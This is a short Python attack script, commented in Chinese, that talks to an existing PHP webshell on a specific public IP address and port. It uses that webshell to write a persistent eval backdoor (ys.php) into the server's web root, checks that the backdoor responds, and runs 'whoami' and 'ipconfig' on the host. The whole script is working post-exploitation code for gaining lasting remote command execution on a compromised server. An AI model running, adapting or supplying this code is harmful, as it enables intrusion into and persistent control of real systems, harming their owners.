#!/usr/bin/env python3
"""通过webshell写稳定shell"""
import urllib.request, ssl, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://124.71.142.158:9096"

def exec_cmd(cmd):
    data = f"x={cmd}".encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(f"{B}/x.php", data=data), timeout=15, context=ctx)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:50]}"

# 1. 写稳定shell (用PHP code)
php = "<?php @eval($_POST[x]);?>"
cmd = f"file_put_contents('D:/phpStudy2/WWW/ys.php', '{php}'); echo 'WRITTEN';"
r = exec_cmd(cmd)
print("写ys.php:", r[-100:], flush=True)

# 2. 验证
try:
    data = b"x=echo STABLE_OK_777;"
    r = urllib.request.urlopen(urllib.request.Request(f"{B}/ys.php", data=data), timeout=10, context=ctx)
    body = r.read().decode("utf-8","ignore")
    print("ys.php验证:", body[:100], flush=True)
except Exception as e:
    print("ys.php ERR:", str(e)[:50], flush=True)

# 3. 执行命令
r = exec_cmd("system('whoami & ipconfig');")
print("whoami/ipconfig:", r[-200:], flush=True)
